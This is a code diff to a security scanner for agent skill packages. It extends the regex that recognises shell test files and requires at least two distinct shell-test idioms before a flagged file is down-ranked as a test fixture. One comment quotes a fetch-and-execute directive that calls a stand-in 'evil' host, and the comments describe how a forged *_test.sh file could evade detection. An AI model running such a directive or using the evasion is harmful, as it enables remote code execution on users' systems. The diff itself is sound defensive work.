@@ -511,8 +511,13 @@ _SKILL_PERSISTENCE_WARN = [
 # FP_TEST_FIXTURE label) — not a live directive. Basename-only (the "# file: <name>"
 # marker _read_skill_text injects strips the directory), so this is a naming-
 # convention signal, not a path-based one.
+#
+# Real-fleet verification (Golden Rule #5) found the shell-test naming convention
+# (*_test.sh / test_*.sh) missing — a real clawstealth test asserting its OWN VPN
+# config validator rejects an unsafe `PostUp = curl http://evil/x | sh` directive
+# false-FAILed, the exact case_01472 class, just in a shell test instead of Python.
 _TEST_FIXTURE_BASENAME_RE = re.compile(
-    r"^(?:test_.*|.*_test|conftest)\.py$|^.*\.(?:spec|test)\.(?:js|ts|tsx|jsx)$",
+    r"^(?:test_.*|.*_test)\.(?:py|sh)$|^conftest\.py$|^.*\.(?:spec|test)\.(?:js|ts|tsx|jsx)$",
     re.I,
 )
 
@@ -527,6 +532,10 @@ _TEST_FIXTURE_BASENAME_RE = re.compile(
 # that a sophisticated attacker crafting fully plausible test-function boilerplate
 # around a live payload is a harder, residual case the tool still surfaces as WARN
 # (not silently drops) rather than FAIL.
+#
+# Python/JS test idioms are specific enough that ONE match suffices (a bare
+# `def test_...(` or `import pytest` is not something an unrelated script would
+# plausibly carry by accident).
 _TEST_SHAPE_RE = re.compile(
     r"\bdef\s+test_\w*\s*\(|\bimport\s+pytest\b|\bimport\s+unittest\b|"
     r"\bclass\s+Test\w*\b|@pytest\.mark\b|\bself\.assert\w*\(",
@@ -534,17 +543,53 @@ _TEST_SHAPE_RE = re.compile(
 )
 
 
+# Shell-test shape (real-fleet verification): bash test harnesses have no single
+# universal idiom like pytest's `def test_`, so this covers the common conventions —
+# bats (`@test`), shunit2/generic (`assert_*`), and hand-rolled counters (`check()`/
+# `PASS=0`/`FAIL=0`) or sandbox-isolation setup (`mktemp -d`), all found verbatim in
+# real clawstealth test files.
+#
+# C-135 (2nd adversarial pass): UNLIKE the Python/JS list above, each shell
+# alternative alone is a common, generic idiom a genuinely malicious *_test.sh
+# (named that way specifically to exploit the basename match) could plausibly
+# carry for unrelated reasons — `mktemp -d` to stage a payload, a `check "msg" ...`
+# call to an unrelated function literally named check, a `PASS=0`-shaped status
+# flag. Requiring only ONE reopened the exact zero-effort forgery the basename+
+# shape combination was built to close. Each alternative is a SEPARATE compiled
+# regex (not one alternation) so _pos_in_test_fixture_file can count how many
+# DISTINCT idioms are present and require at least two — the real clawstealth
+# fixtures hit 4-5 of these; the minimal bypass repro hit exactly 1.
+_SHELL_TEST_SHAPE_SIGNALS = [
+    re.compile(r"@test\b", re.I),
+    re.compile(r"\bassert_\w+\b", re.I),
+    re.compile(r"\bcheck\s*\(\)\s*\{", re.I),
+    re.compile(r"\bcheck\s+[\"'][^\"']+[\"']\s", re.I),
+    re.compile(r"\bPASS=0\b", re.I),
+    re.compile(r"\bFAIL=0\b", re.I),
+    re.compile(r"\bmktemp\s+-d\b", re.I),
+]
+
+
+_SHELL_TEST_SHAPE_MIN_SIGNALS = 2
+
+
 def _pos_in_test_fixture_file(blob: str, pos: int) -> bool:
     """True when *pos* falls inside a "# file: <name>" section whose basename matches
     a test-file naming convention AND whose body has genuine test-code shape — both
-    are required (C-135: a forged header alone is not enough). Scopes a down-rank to
-    exactly that file, not the whole skill (a live attack elsewhere is unaffected)."""
+    are required (C-135: a forged header alone is not enough). A Python/JS test idiom
+    (_TEST_SHAPE_RE) is specific enough to count alone; a shell-test idiom is generic
+    enough (C-135 2nd pass) that at least _SHELL_TEST_SHAPE_MIN_SIGNALS distinct ones
+    must be present. Scopes a down-rank to exactly that file, not the whole skill (a
+    live attack elsewhere is unaffected)."""
     for m in _MANIFEST_HEADER_RE.finditer(blob):
         if m.start("body") <= pos < m.end("body"):
-            return bool(
-                _TEST_FIXTURE_BASENAME_RE.match(m.group("name").strip())
-                and _TEST_SHAPE_RE.search(m.group("body"))
-            )
+            if not _TEST_FIXTURE_BASENAME_RE.match(m.group("name").strip()):
+                return False
+            body = m.group("body")
+            if _TEST_SHAPE_RE.search(body):
+                return True
+            shell_signal_count = sum(1 for rx in _SHELL_TEST_SHAPE_SIGNALS if rx.search(body))
+            return shell_signal_count >= _SHELL_TEST_SHAPE_MIN_SIGNALS
     return False
 
 
